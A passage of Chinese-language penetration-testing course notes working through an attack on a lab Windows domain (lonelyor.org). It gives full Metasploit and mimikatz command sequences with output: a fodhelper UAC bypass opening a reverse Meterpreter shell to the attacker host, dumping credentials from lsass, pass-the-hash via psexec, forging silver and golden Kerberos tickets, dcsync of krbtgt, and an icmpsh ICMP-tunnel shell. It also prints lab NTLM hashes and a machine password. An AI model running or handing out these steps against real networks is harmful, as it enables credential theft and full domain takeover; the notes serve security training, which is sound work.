   6   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   7   exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
   8   exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
   9   exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)
   10  exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)
   11  exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
   12  exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)


Interact with a module by name or index. For example info 12, use 12 or use exploit/windows/local/bypassuac_sluihijack

# 指定要使用的模块
msf6 exploit(windows/local/bypassuac_sluihijack) > use 11
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

# 指定会话
msf6 exploit(windows/local/bypassuac_fodhelper) > set session 2
session => 2

msf6 exploit(windows/local/bypassuac_fodhelper) > exploit 

[*] Started reverse TCP handler on 192.168.231.153:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\fodhelper.exe
[*] Sending stage (175686 bytes) to 192.168.231.103
[*] Cleaining up registry keys ...
[*] Meterpreter session 3 opened (192.168.231.153:4444 -> 192.168.231.103:49762) at 2023-11-11 01:46:49 -0500

meterpreter > 
# 开始提权
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

### 1.3 wiki获取域内用户密码

#### 1.3.1 wiki工具介绍

wiki是Mimikatz的升级版，只支持x64和x32的进程，如果在x86进程的话，有些功能会无法实现

#### 1.3.2 meterpreter进程迁移

```bash
# 查看当前Meterpreter的进程系统
meterpreter > sysinfo
Computer        : LONELYOR-WIN10
OS              : Windows 10 (10.0 Build 16299).
Architecture    : x64
System Language : zh_CN
Domain          : LONELYOR
Logged On Users : 7
Meterpreter     : x86/windows		# 看这里，是x86，要做迁移

# 查看启动的进程
meterpreter > ps

Process List
============

 PID   PPID  Name                   Arch  Session  User                          Path
 ---   ----  ----                   ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                 x64   0
 132   668   dllhost.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dllhost.exe
 304   668   svchost.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 336   4     smss.exe               x64   0
 396   648   dwm.exe                x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 424   668   svchost.exe            x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 460   452   csrss.exe              x64   0
 468   808   RuntimeBroker.exe      x64   1        LONELYOR\xiaofei              C:\Windows\System32\RuntimeBroker.exe
 492   668   svchost.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 548   452   wininit.exe            x64   0
 564   540   csrss.exe              x64   1
 648   540   winlogon.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   548   services.exe           x64   0
 704   548   lsass.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 760   668   svchost.exe            x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 808   668   svchost.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 824   668   svchost.exe            x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 836   548   fontdrvhost.exe        x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
 848   6064  conhost.exe            x64   1        LONELYOR\xiaofei              C:\Windows\System32\conhost.exe
 892   668   svchost.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 968   648   fontdrvhost.exe        x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
 1072  668   svchost.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1100  668   svchost.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1272  668   svchost.exe            x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1320  668   svchost.exe            x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1476  668   svchost.exe            x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1484  4     Memory Compression     x64   0
 1664  668   svchost.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1712  808   WmiPrvSE.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1836  668   svchost.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1884  668   svchost.exe            x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1892  808   scrcons.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\scrcons.exe
 2032  668   svchost.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2136  668   spoolsv.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2236  668   svchost.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2256  668   SecurityHealthService  x64   0
             .exe
 2312  668   vmtoolsd.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.
                                                                                 exe
 2328  668   vm3dservice.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vm3dservice.exe
 2340  668   VGAuthService.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VG
                                                                                 Auth\VGAuthService.exe
 2500  2328  vm3dservice.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\vm3dservice.exe
 3200  668   msdtc.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 3584  668   svchost.exe            x64   1        LONELYOR\xiaofei              C:\Windows\System32\svchost.exe
 3700  492   sihost.exe             x64   1        LONELYOR\xiaofei              C:\Windows\System32\sihost.exe
 3772  492   taskhostw.exe          x64   1        LONELYOR\xiaofei              C:\Windows\System32\taskhostw.exe
 3932  4304  shell (1).exe          x86   1        LONELYOR\xiaofei              C:\Users\xiaofei\Downloads\shell (1).exe
 3972  808   WmiPrvSE.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
 4080  1072  ctfmon.exe             x64   1        LONELYOR\xiaofei              C:\Windows\System32\ctfmon.exe
 4260  808   RuntimeBroker.exe      x64   1        LONELYOR\xiaofei              C:\Windows\System32\RuntimeBroker.exe
 4304  4276  explorer.exe           x64   1        LONELYOR\xiaofei              C:\Windows\explorer.exe
 4424  808   ChsIME.exe             x64   1        LONELYOR\xiaofei              C:\Windows\System32\InputMethod\CHS\ChsIME.exe
 4712  808   ShellExperienceHost.e  x64   1        LONELYOR\xiaofei              C:\Windows\SystemApps\ShellExperienceHost_cw5n
             xe                                                                  1h2txyewy\ShellExperienceHost.exe
 4872  808   SearchUI.exe           x64   1        LONELYOR\xiaofei              C:\Windows\SystemApps\Microsoft.Windows.Cortan
                                                                                 a_cw5n1h2txyewy\SearchUI.exe
 4968  808   RuntimeBroker.exe      x64   1        LONELYOR\xiaofei              C:\Windows\System32\RuntimeBroker.exe
 5076  808   WmiPrvSE.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\wbem\WmiPrvSE.exe
 5248  668   SearchIndexer.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 6000  4304  vmtoolsd.exe           x64   1        LONELYOR\xiaofei              C:\Program Files\VMware\VMware Tools\vmtoolsd.
                                                                                 exe
 6064  4212  powershell.exe         x86   1        LONELYOR\xiaofei              C:\Windows\SysWOW64\WindowsPowerShell\v1.0\pow
                                                                                 ershell.exe
 6132  668   svchost.exe            x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe

# 迁移进程
meterpreter > migrate 704
[*] Migrating from 6064 to 704...
[*] Migration completed successfully.
# 查看当前Meterpreter的进程系统
meterpreter > sysinfo
Computer        : LONELYOR-WIN10
OS              : Windows 10 (10.0 Build 16299).
Architecture    : x64
System Language : zh_CN
Domain          : LONELYOR
Logged On Users : 7
Meterpreter     : x64/windows
```

#### 1.3.3 wiki获取域内用户密码

```bash
# 加载wiki
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
# 获取用户密码
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username         Domain    NTLM                              SHA1                              DPAPI
--------         ------    ----                              ----                              -----
LONELYOR-WIN10$  LONELYOR  4459a6435ee31bdc94cb068596192548  353b4161904cf78f738cbdecae9aad8f
                                                             3e25ddfe
xiaofei          LONELYOR  47bf8039a8506cd67c524a03ff84ba4e  d2124cab9a30639bdb202a185264475a  f17521edb2c95c9b8e864c464c8d6293
                                                             693a5481

wdigest credentials
===================

Username         Domain    Password
--------         ------    --------
(null)           (null)    (null)
LONELYOR-WIN10$  LONELYOR  (null)
xiaofei          LONELYOR  (null)

kerberos credentials
====================

Username         Domain        Password
--------         ------        --------
(null)           (null)        (null)
LONELYOR-WIN10$  lonelyor.org  V.6dHTD2ZJdtc8"8B*xtWwhxy.R;mO:b\*,\6.V;sm#KY_xth%'\+ZXjQF<t@QfxXxp(\Zt=,$#cm5;nS",5[Cr_o?GZycdq
                               gjag3Y2^u_3ko'i`f6Yx'"$i
lonelyor-win10$  LONELYOR.ORG  (null)
xiaofei          LONELYOR.ORG  (null)


meterpreter > 
```

破解结果

![image-20231111150303211](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231111150303211.png)

#### 1.3.4 metrepreter获取密码

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lonelyor:1001:aad3b435b51404eeaad3b435b51404ee:3b972cab044c498843e8438b1f854f4f:::
plsec:1002:aad3b435b51404eeaad3b435b51404ee:d39b9035413146077e55ac4d8cd03922:::
skill:1011:aad3b435b51404eeaad3b435b51404ee:394cb82b14ebfcf86eaedc13fe293e15:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7944e349cf5bcef1da0cb7f35930f034:::
```

## 2. PTH哈希传递攻击

### 2.1 PTH哈希传递攻击原理

系统对于请求认证只会校验两个方面：

1. 校验用户名：通过用户名判断该用户是否有访问该服务的权限
2. 校验NTLM Hash：通过该Hash校验用户密码

基于这两个前提，如果黑客在域成员机中获取了拥有管理员权限的用户与该用户的NTLM Hash，即可发起PTH攻击，冒用该用户的身份去请求其他服务

### 2.2 PTH攻击复现

基于第一段的攻击流程，拿到了靶机的系统权限；

攻击流程：

1. 获取管理员或用户的NTLM Hash
2. 通过NTLM Hash与用户名申请域控SMB服务
3. 通过SMB服务向靶机写入木马并运行

#### 2.2.1 信息搜集

```bash
C:\Windows\system32>ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : lonelyor-win10
   Primary Dns Suffix  . . . . . . . : lonelyor.org			# 域名
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : lonelyor.org

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-0C-29-10-9F-07
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::d193:c2c9:de16:150b%12(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.231.103(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.231.2
   DHCPv6 IAID . . . . . . . . . . . : 50334761
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2B-F6-33-CC-00-0C-29-10-9F-07
   DNS Servers . . . . . . . . . . . : 192.168.231.102		# 域IP地址
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

#### 2.2.2 获取NTML 哈希

```bash
meterpreter > kiwi_cmd sekurlsa::logonPasswords

Authentication Id : 0 ; 215617 (00000000:00034a41)
Session           : Interactive from 1
User Name         : xiaofei
Domain            : LONELYOR
Logon Server      : WINSRV-2016
Logon Time        : 2023/11/11 14:41:50
SID               : S-1-5-21-3199196146-2196162486-1764246383-1602
        msv :
         [00000003] Primary
         * Username : xiaofei
         * Domain   : LONELYOR
         * NTLM     : 47bf8039a8506cd67c524a03ff84ba4e
         * SHA1     : d2124cab9a30639bdb202a185264475a693a5481
         * DPAPI    : f17521edb2c95c9b8e864c464c8d6293
        tspkg :
        wdigest :
         * Username : xiaofei
         * Domain   : LONELYOR
         * Password : (null)
        kerberos :
         * Username : xiaofei
         * Domain   : LONELYOR.ORG
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 215592 (00000000:00034a28)
Session           : Interactive from 1
User Name         : xiaofei
Domain            : LONELYOR
Logon Server      : WINSRV-2016
Logon Time        : 2023/11/11 14:41:49
SID               : S-1-5-21-3199196146-2196162486-1764246383-1602
        msv :
         [00000003] Primary
         * Username : xiaofei
         * Domain   : LONELYOR
         * NTLM     : 47bf8039a8506cd67c524a03ff84ba4e
         * SHA1     : d2124cab9a30639bdb202a185264475a693a5481
         * DPAPI    : f17521edb2c95c9b8e864c464c8d6293
        tspkg :
        wdigest :
         * Username : xiaofei
         * Domain   : LONELYOR
         * Password : (null)
        kerberos :
         * Username : xiaofei
         * Domain   : LONELYOR.ORG
         * Password : (null)
        ssp :
        credman :
```

#### 2.2.3 内网提权

提权模块：`windows/smb/psexec`

根据wiki返回的票据结果填入如下信息；**SMBUser是：xiaofei**

![image-20231111165728671](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231111165728671.png)

提权成功

![image-20231111165813038](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231111165813038.png)

疑问：为什么SMBPass是：` 00000000000000000000000000000000:47bf8039a8506cd67c524a03ff84ba4e`

Windows密码由两部分组成：`LM Hash:NTLM Hash`，在win2008之后，Windows默认禁用LM Hash，所以这就是为什么LM Hash全0的原因

在以下情况下，可以证明不存在LM哈希：

- 从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash
- 在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，只能读取哈希值
- 如果密码大于14个字符，Windows就自动使用NTLM对其进行加密，LM Hash将不再存在
- 如果我们抓到的LM Hash是`AAD3B435B51404EEAAD3B435B51404EE`或者以`AA3D`开头显示的，也表示密码位数超过14位，对我们来说没用，不能靠他来查LM彩虹表
- 如果你看到的LM哈希是32个零，那么这实际上表示不存在LM哈希。这是因为现代的Windows系统默认不再生成LM哈希，只生成NT哈希。当LM哈希不存在时，它会被表示为32个零。所以，你看到的`00000000000000000000000000000000`实际上表示不存在LM哈希

## 3 白银票据伪造

### 3.1 白银票据伪造条件

由于已将在AS服务器中认证了用户身份，所以这里不会再校验用户名

```
/domain: 域名称
/sid： 域的SID值（krbtgt的SID）
/service：服务器名称（FQDN）
/rc4：域的服务账户的HASH值（不是krbtgt，是域控）
/user：伪造的用户名（任意的用户名）
/ppt：标识的是Pass The Ticket攻击，是把生成的票据导入内存
```

### 3.2 获取域名

```bash
C:\Windows\system32>ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : lonelyor-win10
   Primary Dns Suffix  . . . . . . . : lonelyor.org			# 域名
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : lonelyor.org

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-0C-29-10-9F-07
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::d193:c2c9:de16:150b%12(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.231.103(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.231.2
   DHCPv6 IAID . . . . . . . . . . . : 50334761
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2B-F6-33-CC-00-0C-29-10-9F-07
   DNS Servers . . . . . . . . . . . : 192.168.231.102		# 域IP地址
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

### 3.3.3 获取kebtgt的SID

`S-1-5-21-3199196146-2196162486-1764246383-502 = SID-UID `，502为UID，所以最后的SID是：`S-1-5-21-3199196146-2196162486-1764246383`

```bash
C:\Windows\system32>wmic useraccount where name="krbtgt" get sid
wmic useraccount where name="krbtgt" get sid
SID                                            
S-1-5-21-3199196146-2196162486-1764246383-502 
```

### 3.4 获取服务器的NTLM Hash

```bash
meterpreter > kiwi_cmd sekurlsa::logonPasswords

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WINSRV-2016$
Domain            : LONELYOR
Logon Server      : (null)
Logon Time        : 2023/11/11 14:22:28
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WINSRV-2016$
         * Domain   : LONELYOR
         * NTLM     : b9ecce08fea0f482ac2994f301f12a53		# NTLM Hash
         * SHA1     : 7d6a73294925fb156b90e3006b9a2f7563e3210d
        tspkg :
        wdigest :
         * Username : WINSRV-2016$
         * Domain   : LONELYOR
         * Password : (null)
        kerberos :
         * Username : winsrv-2016$
         * Domain   : LONELYOR.ORG
         * Password : (null)
        ssp :
        credman :
```

### 3.5 计算机名

**注意：**拼接上域名，`WINSRV-2016.lonelyor.org`

```bash
C:\Windows\system32>hostname
hostname
WINSRV-2016
```

### 3.6 信息汇总

```bash
域名：lonelyor.org
SID：S-1-5-21-3199196146-2196162486-1764246383
计算机名：WINSRV-2016.lonelyor.org
服务名：CIFS 
NTLM Hash：b9ecce08fea0f482ac2994f301f12a53
用户名：随意
```

### 3.7 制造白银票据

将信息按下面格式写入，以后改也是将着这个格式该就好

```bash
kiwi_cmd kerberos::golden /domain:lonelyor.org /sid:S-1-5-21-3199196146-2196162486-1764246383 /target:WINSRV-2016.lonelyor.org /service:CIFS /rc4:b9ecce08fea0f482ac2994f301f12a53 /user:Administrator /ptt
```

### 3.8 导入白银票据

回到域成员机导入白银票据

```bash
# 清空票据
eterpreter > kiwi_cmd kerberos::purge
Ticket(s) purge for current session is OK

# 导入票据
meterpreter > kiwi_cmd kerberos::golden /domain:lonelyor.org /sid:S-1-5-21-3199196146-2196162486-1764246383 /target:WINSRV-2016.lonelyor.org /service:CIFS /rc4:b9ecce08fea0f482ac2994f301f12a53 /user:Administrator /ptt
User      : Administrator
Domain    : lonelyor.org (LONELYOR)
SID       : S-1-5-21-3199196146-2196162486-1764246383
User Id   : 500
Groups Id : *513 512 520 518 519 
ServiceKey: b9ecce08fea0f482ac2994f301f12a53 - rc4_hmac_nt      
Service   : CIFS
Target    : WINSRV-2016.lonelyor.org
Lifetime  : 2023/11/11 23:00:28 ; 2033/11/8 23:00:28 ; 2033/11/8 23:00:28
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ lonelyor.org' successfully submitted for current session

# 验证结果
C:\Windows\system32>dir\\WINSRV-2016.lonelyor.org\Downloads
dir\\WINSRV-2016.lonelyor.org\Downloads
 Volume in drive \\WINSRV-2016.lonelyor.org\Downloads has no label.
 Volume Serial Number is D05B-D2A7

 Directory of \\WINSRV-2016.lonelyor.org\Downloads

2022/04/13  14:48    <DIR>          .
2022/04/13  14:48    <DIR>          ..
2022/04/13  14:48                 8 flag.txt
2022/04/10  16:31            73,802 shell.exe
               2 File(s)         73,810 bytes
               2 Dir(s)  93,781,090,304 bytes free
```

## 4. 黄金票据

### 4.1 黄金票据前提条件

```bash
域名称
域的SID（Object Security ID）值
域的KRBTGT账户密码HASH（可以是aes256_hmac或者是ntml hash）
伪造用户名，可以随意
```

### 4.2 获取SID和KRBTGR的NTLM Hash

+ NTLM Hash：`0147bf1b3fbdd849f9dbbb90018310e0`
+ SID：`S-1-5-21-3199196146-2196162486-1764246383`

**注意：**` S-1-5-21-3199196146-2196162486-1764246383-502`为UID，所以需要去掉

```bash
meterpreter > dcsync_ntlm krbtgt
[!] Running as SYSTEM; function will only work if this computer account has replication privileges (e.g. Domain Controller)
[+] Account   : krbtgt
[+] NTLM Hash : 0147bf1b3fbdd849f9dbbb90018310e0
[+] LM Hash   : a8355c217f333528ec5de4972b2346fb
[+] SID       : S-1-5-21-3199196146-2196162486-1764246383-502
[+] RID       : 502
```

### 4.3 获取域名

```bash
C:\Windows\system32>ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : lonelyor-win10
   Primary Dns Suffix  . . . . . . . : lonelyor.org			# 域名
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : lonelyor.org

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-0C-29-10-9F-07
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::d193:c2c9:de16:150b%12(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.231.103(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.231.2
   DHCPv6 IAID . . . . . . . . . . . : 50334761
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2B-F6-33-CC-00-0C-29-10-9F-07
   DNS Servers . . . . . . . . . . . : 192.168.231.102		# 域IP地址
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

### 4.4 生成黄金票据

回到域成员机并生成黄金票据，后续使用也按下面格式填入信息即可

```bash
meterpreter > golden_ticket_create -d lonelyor.org -u lonelyor -s S-1-5-21-3199196146-2196162486-1764246383 -k 0147bf1b3fbdd849f9dbbb90018310e0 -t /tmp/gt.ticket
[+] Golden Kerberos ticket written to /tmp/gt.ticket
```

### 4.5 导入黄金票据

```bash
meterpreter > kerberos_ticket_use /tmp/gt.ticket
[*] Using Kerberos ticket stored in /tmp/gt.ticket, 1828 bytes ...
[+] Kerberos ticket applied successfully.
```

### 4.6 结果验证

```bash
C:\Windows\system32>dir\\WINSRV-2016.lonelyor.org\Downloads
dir\\WINSRV-2016.lonelyor.org\Downloads
 Volume in drive \\WINSRV-2016.lonelyor.org\Downloads has no label.
 Volume Serial Number is D05B-D2A7

 Directory of \\WINSRV-2016.lonelyor.org\Downloads

2022/04/13  14:48    <DIR>          .
2022/04/13  14:48    <DIR>          ..
2022/04/13  14:48                 8 flag.txt
2022/04/10  16:31            73,802 shell.exe
               2 File(s)         73,810 bytes
               2 Dir(s)  93,780,955,136 bytes free
```

## 5. 票据攻击总结

+ 访问权限不同：
  + Golden Ticket：伪造TGT，可以获取任意Kerberos服务权限
  + Sliver Ticket：伪造TGS，只能访问指定的服务
+ 加密方式不同
  + Golden Tick由Kerberos（KRBTGT）的Hash加密
  + Sliver Ticket由服务账号（通常为计算机账户）Hash加密
+ Goden Ticket的利用过程需要访问域控，而Sliver Ticker不需要
+ 白银票据不同于黄金票据，白银票据的利用过程是伪造TGS，通过已知的授权服务器密码生成一张可以访问该服务的TGT。因为在票据生成过程中不需要使用KDC。所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由KDC源发TGT。并且在生成伪造的TGT的20分钟内，TGS不会对该TGT的真伪进行校验
+ 白银票据依赖于服务账号的密码哈希值，着不同于黄金票据利用需要使用krbtgt账号的密码哈希值，因此更加隐蔽

# 第七章：隐蔽通信技术

## 1. ICMP隧道

### 1.1 工作原理

 请求端的 Ping 工具通常会在 ICMP 数据包后面附加上一段随机的数据作为 Payload，而响应端则会拷贝这段 Payload 到 ICMP 响应数据包中返还给请求端，用于识别和匹配 Ping 请求。

 Windows 和 Linux 系统下的 Ping 工具默认的 Payload 长度为 64 比特，**但实际上协议允许附加最大 64K 大小的 Payload**。

 对于隧道数据，icmptunnel 首先会指定客户端和服务器端。随后，客户端会将 IP 帧封装在 ICMP 请求数据包中发送给服务器，而服务器端则会使用相匹配的 ICMP 响应数据包进行回复。这样在旁人看来，网络中传播的仅仅只是正常的 ICMP 数据包。

**总结：**由于系统允许ICMP payload的最大长度为64K，所以可以利用这一点，**在ICMP的数据中在封装一个完整的数据包在里面**，当客户端解开ICMP报文后就会继续解开这个完整数据包

### 1.2 复现过程

#### 1.2.1 工具安装

坑点：由于最新版的`impacket`的数据包已经不支持`python 2.7`，这里需要去`https://pypi.org/`查`impacket`的开发日志，去找合适的版本来安装

```
git clone https://github.com/inquisb/icmpsh.git
python2 -m pip install --upgrade setuptools
pip2 install impacket==0.9.19

# 因为icmpsh工具要代替系统本身的ping命令的应答程序，所以需要输入如下命令来关闭本地系统的ICMP答应（如果要恢复系统答应，则设置为0），否则Shell的运行会不稳定.
sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

### 1.2.2 复现

```bash
# 将 icmpsh.exe 复制到靶机
┌──(root㉿kali)-[/home/kali/tunnel/icmpsh]
└─# ls              
icmpsh.exe  icmpsh-m.c  icmpsh-m.pl  icmpsh_m.py  icmpsh-s.c  README.md  run.sh  screenshots
```

靶机运行

```bash
C:\Users\xiaofei\Downloads>icmpsh.exe -t 192.168.231.153（攻击机IP地址）
```

Kali运行

```bash
┌──(root㉿kali)-[/home/kali/tunnel/icmpsh]
└─# python2 icmpsh_m.py 192.168.231.153(攻击机IP) 192.168.231.103(被攻击机IP)
```

Kali先监听，靶机再运行

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231112164558687.png" alt="image-20231112164558687" style="zoom:67%;" />

可以看到这些超大的ICMP报文

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231112164403219.png" alt="image-20231112164403219" style="zoom:67%;" />

## 2. 传输层隧道

### 2.1 下载地址

```
Linux:   https://github.com/windworst/LCX
windows: https://github.com/UndefinedIdentifier/LCX
```

### 2.2 LCX工作原理

**适用端口转发的网络环境有以下几种：**

1、服务器处于内网，可以出网。

2、服务器处于外网，可以出网，但是服务器安装了防火墙来拒绝敏感端口的连接。

